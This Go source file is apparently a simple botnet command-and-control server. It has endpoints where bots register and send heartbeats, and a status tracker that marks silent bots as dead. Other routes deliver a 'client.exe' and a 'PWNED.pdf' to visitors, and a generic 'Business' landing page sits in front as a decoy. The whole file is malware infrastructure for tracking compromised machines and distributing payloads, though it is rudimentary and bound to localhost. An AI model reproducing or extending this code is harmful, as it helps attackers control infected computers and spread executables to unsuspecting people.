package main

import (
	"encoding/json"
	"fmt"
	"github.com/gorilla/mux"
	"html/template"
	"log"
	"net/http"
	"path/filepath"
	"sync"
	"time"
)

// temporary directory location
//var srcDir = filepath.FromSlash("H:\\GolandProjects\\Botnet\\src")

var srcDir = filepath.FromSlash("C:\\Users\\laugh\\GolandProjects\\Botnet\\src")

var templates = template.Must(template.ParseFiles("./templates/base.html", "./templates/body.html"))

type bot struct {
	Id     string `json:"bot_id"`
	Status string `json:"status"`
}

type botstatus struct {
	Status   string
	Lastseen time.Time
}

type botmap map[string]botstatus

var m = make(botmap)

func showbots(res http.ResponseWriter, req *http.Request) {
	for k, v := range m {
		_, err := fmt.Fprintf(res, "%s, %s,", k, v.Status)
		if err != nil {
			return
		}
		fmt.Fprintln(res, " ", v.Lastseen.UTC())

	}
}

func register(rw http.ResponseWriter, req *http.Request) {
	var b bot
	var bs botstatus

	err := json.NewDecoder(req.Body).Decode(&b)
	if err != nil {
		http.Error(rw, err.Error(), http.StatusBadRequest)
		return
	}

	_, ok := m[b.Id]
	if ok {
		fmt.Printf("Bot %s reconnected!\n", b.Id)
		bs.Status = b.Status
		bs.Lastseen = time.Now()
		m[b.Id] = bs
	} else {
		bs.Status = b.Status
		bs.Lastseen = time.Now()
		m[b.Id] = bs

		fmt.Printf("New Bot!\nID: %s\nStatus: %s\n", b.Id, b.Status)
		fmt.Println("Time registered: ", bs.Lastseen.UTC())
		_, err = fmt.Fprintf(rw, "Registered!\n")
		if err != nil {
			return
		}
	}

}

func heartbeat(res http.ResponseWriter, req *http.Request) {
	var b bot
	var bs botstatus

	err := json.NewDecoder(req.Body).Decode(&b)
	if err != nil {
		http.Error(res, err.Error(), http.StatusBadRequest)
		return
	}
	bs.Status = b.Status
	bs.Lastseen = time.Now()

	m[b.Id] = bs

	//fmt.Printf("heartbeat from %s", b.Id)
	//fmt.Println(" at ", bs.Lastseen.UTC())
}

func statusupdater() {
	var bs botstatus
	for true {
		if len(m) > 0 {
			time.Sleep(time.Second)
			for k, v := range m {
				start := v.Lastseen
				end := time.Now()
				diff := end.Sub(start)
				//fmt.Println("difference in seconds is ", diff.Seconds())
				if diff.Seconds() > 4 {
					bs.Status = "dead"
					bs.Lastseen = v.Lastseen
					m[k] = bs
				}
			}
		}
	}
}

func pdfserver(res http.ResponseWriter, req *http.Request) {
	http.ServeFile(res, req, filepath.Join(srcDir, "/files/PWNED.pdf"))
}

func clientserver(res http.ResponseWriter, req *http.Request) {
	http.ServeFile(res, req, filepath.Join(srcDir, "/files/client.exe"))
}

func index() http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b := struct {
			Title        template.HTML
			BusinessName string
			Slogan       string
		}{
			Title:        template.HTML("Business &verbar; Landing"),
			BusinessName: "Business,",
			Slogan:       "we get things done.",
		}
		err := templates.ExecuteTemplate(w, "base", &b)
		if err != nil {
			http.Error(w, fmt.Sprintf("index: couldn't parse template: %v", err), http.StatusInternalServerError)
			return
		}
		w.WriteHeader(http.StatusOK)
	})
}

func logging(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		start := time.Now()
		req := fmt.Sprintf("%s %s", r.Method, r.URL)
		log.Println(req)
		next.ServeHTTP(w, r)
		log.Println(req, "completed in", time.Now().Sub(start))
	})
}

func public() http.Handler {
	return http.StripPrefix("/public/", http.FileServer(http.Dir("./public")))
}

func newRouter() *mux.Router {
	r := mux.NewRouter()

	r.PathPrefix("/public/").Handler(logging(public())).Methods("GET")

	fmt.Printf("Starting server at port 8081\n")

	r.HandleFunc("/pdf", pdfserver)

	r.HandleFunc("/register", register)

	r.HandleFunc("/client", clientserver)

	r.HandleFunc("/showbots", showbots)

	r.HandleFunc("/heartbeat", heartbeat)

	r.PathPrefix("/").Handler(logging(index())).Methods("GET")

	return r
}

func main() {
	r := newRouter()

	wg := new(sync.WaitGroup)

	wg.Add(2)

	log.Println("Listening...")

	go func() {
		log.Fatal(http.ListenAndServe("localhost:8081", r))
		wg.Done()
	}()

	go func() {
		statusupdater()
		wg.Done()
	}()

	wg.Wait()

}
